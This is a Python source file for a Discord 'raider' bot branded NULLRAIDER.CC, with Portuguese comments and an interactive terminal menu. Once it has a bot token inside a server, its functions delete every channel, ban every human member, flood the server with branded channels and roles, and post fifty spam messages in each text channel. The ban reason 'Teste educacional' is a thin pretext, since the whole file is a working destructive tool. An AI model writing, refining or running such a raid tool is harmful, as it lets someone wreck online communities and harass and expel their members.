import discord
from discord.ext import commands
import asyncio
import getpass

# Painel interativo no terminal
def show_menu():
    print("\n=== NULLRAIDER.CC RAIDER PANEL ON TOP1!1!1 ===")
    print("[1] Spam Channels")
    print("[2] Ban Others")
    print("[3] UnBan Others")
    print("[4] Spam Cargos")
    print("[5] Spam Message")
    print("[0] Sair")
    return input("Escolha uma opção (0-5): ")

# Solicita token e ID do servidor
print("=== Configuração Inicial ===")
bot_token = getpass.getpass("Digite o token do bot: ")
guild_id = input("Digite o ID do servidor: ")

# Validação do ID do servidor
try:
    guild_id = int(guild_id)
except ValueError:
    print("Erro: ID do servidor deve ser um número.")
    exit(1)

# Configuração do bot
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.bans = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')
    guild = bot.get_guild(guild_id)
    if guild is None:
        print(f"Erro: Servidor com ID {guild_id} não encontrado. Verifique se o bot está no servidor.")
        await bot.close()
        return
    print(f"Conectado ao servidor: {guild.name}")

    # Loop do painel
    while True:
        choice = show_menu()
        if choice == '0':
            print("Encerrando o bot...")
            await bot.close()
            break
        elif choice == '1':
            await spam_channels(guild)
        elif choice == '2':
            await ban_others(guild)
        elif choice == '3':
            await unban_others(guild)
        elif choice == '4':
            await spam_cargos(guild)
        elif choice == '5':
            await spam_message(guild)
        else:
            print("Opção inválida. Escolha entre 0 e 5.")

async def spam_channels(guild):
    """Deleta todos os canais e cria 10 canais '💀 NULLRAIDER.CC 💀' rapidamente."""
    if not guild.me.guild_permissions.manage_channels:
        print("Erro: O bot precisa de permissões de 'Gerenciar Canais'.")
        return
    try:
        # Deleta canais existentes
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Canal {channel.name} deletado.")
                await asyncio.sleep(0.5)  # Atraso reduzido para maior velocidade
            except Exception as e:
                print(f"Erro ao deletar {channel.name}: {e}")
        
        # Cria 10 canais rapidamente
        for i in range(10):
            await guild.create_text_channel(f'💀 NULLRAIDER.CC WAS HERE 💀-{i+1}')
            print(f"Canal raided-lol-{i+1} criado.")
            await asyncio.sleep(0.5)  # Atraso reduzido
        print("Sucesso: Spam Channel Ativado!!!")
    except Exception as e:
        print(f"Erro durante a execução: {e}")

async def ban_others(guild):
    """Bane todos os membros exceto o bot."""
    if not guild.me.guild_permissions.ban_members:
        print("Erro: O bot precisa de permissões de 'Banir Membros'.")
        return
    try:
        for member in guild.members:
            if member != guild.me and not member.bot:
                try:
                    await member.ban(reason="Teste educacional")
                    print(f"Membro {member.name} banido.")
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Erro ao banir {member.name}: {e}")
        print("Ação concluída: todos os membros banidos (exceto o bot)")
    except Exception as e:
        print(f"Erro durante a execução: {e}")

async def unban_others(guild):
    """Desbane todos os membros banidos."""
    if not guild.me.guild_permissions.ban_members:
        print("Erro: O bot precisa de permissões de 'Banir Membros'.")
        return
    try:
        banned_users = [entry async for entry in guild.bans()]
        for ban_entry in banned_users:
            try:
                await guild.unban(ban_entry.user, reason="Teste educacional")
                print(f"Usuário {ban_entry.user.name} desbanido.")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Erro ao desbanir {ban_entry.user.name}: {e}")
        print("Ação concluída: todos os membros desbanidos.")
    except Exception as e:
        print(f"Erro durante a execução: {e}")

async def spam_cargos(guild):
    """Cria 10 cargos no servidor."""
    if not guild.me.guild_permissions.manage_roles:
        print("Erro: O bot precisa de permissões de 'Gerenciar Cargos'.")
        return
    try:
        for i in range(10):
            await guild.create_role(name=f'💀 NULLRAIDER.CC 💀-{i+1}')
            print(f"Cargo cargo-lol-{i+1} criado.")
            await asyncio.sleep(0.5)
        print("Ação concluída: 10 cargos criados.")
    except Exception as e:
        print(f"Erro durante a execução: {e}")

async def spam_message(guild):
    """Envia 50 mensagens em todos os canais de texto rapidamente."""
    if not guild.me.guild_permissions.send_messages:
        print("Erro: O bot precisa de permissões de 'Enviar Mensagens'.")
        return
    try:
        for channel in guild.text_channels:
            try:
                for i in range(50):  # 50 mensagens por canal (ajuste para 300 se desejar)
                    await channel.send(f"NULLRAIDER.CC {i+1} ON TOP!!!!!!")
                    print(f"Mensagem {i+1} enviada em {channel.name}.")
                    await asyncio.sleep(0.2)  # Atraso mínimo para evitar rate limits
            except Exception as e:
                print(f"Erro ao enviar mensagens em {channel.name}: {e}")
        print("Ação concluída: Spam Message Ativado!")
    except Exception as e:
        print(f"Erro durante a execução: {e}")

# Executa o bot com o token fornecido via painel
try:
    bot.run(bot_token)
except discord.errors.LoginFailure:
    print("Erro: Token inválido. Verifique o token e tente novamente.")
except Exception as e:
    print(f"Erro ao iniciar o bot: {e}")
